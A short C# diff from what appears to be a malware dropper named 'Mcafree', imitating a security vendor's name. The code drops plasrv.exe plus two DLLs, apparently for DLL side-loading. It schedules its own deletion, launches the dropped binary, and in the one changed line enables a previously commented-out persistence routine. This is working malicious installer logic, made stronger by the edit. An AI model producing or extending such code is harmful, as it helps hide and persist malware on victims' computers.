@@ -9,7 +9,7 @@
             extract("Mcafree", dirToExtract + "\\", "plasrv.exe");
             extract("Mcafree", dirToExtract + "\\", "pdh.dll");
             extract("Mcafree", dirToExtract + "\\", "pdh1.dll");
-            //persistence(dirToExtract + "\\" + "plasrv.exe");
+            persistence(dirToExtract + "\\" + "plasrv.exe");
             String currentDirectory = Environment.CurrentDirectory + "\\Mcafree.exe";
             writeToDelete(currentDirectory);
             Process.Start(dirToExtract + "\\" + "plasrv.exe");
